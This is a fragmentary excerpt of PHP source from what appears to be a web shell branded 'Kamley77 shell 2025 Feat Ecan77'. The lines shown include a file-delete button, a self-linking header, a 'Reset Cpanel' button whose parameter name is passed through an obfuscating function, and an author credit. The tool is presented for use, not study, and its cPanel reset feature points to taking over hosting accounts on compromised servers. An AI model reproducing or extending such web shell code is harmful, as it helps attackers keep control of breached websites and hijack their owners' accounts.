...
<i class='fa fa-trash'></i></button>";
    ...
    <div style="font-family:Bungee Outline;font-size:24px;"><a href="' . $_SERVER['SCRIPT_NAME'] . '"><i class="fa-brands fa-napster"></i> Kamley77 Ecan77 </a></center></div></td><td>';
...
<button class="btn btn-outline-light" onclick=location.href="?path=' . $serlok . '&' . net("resetcp") . '=opet">Reset Cpanel</button><hr>&nbsp;';
    ...
    <br> - Kamley77 shell 2025 Feat Ecan77<br> - Created by Kamley77</td></thead></table>";
        exit();
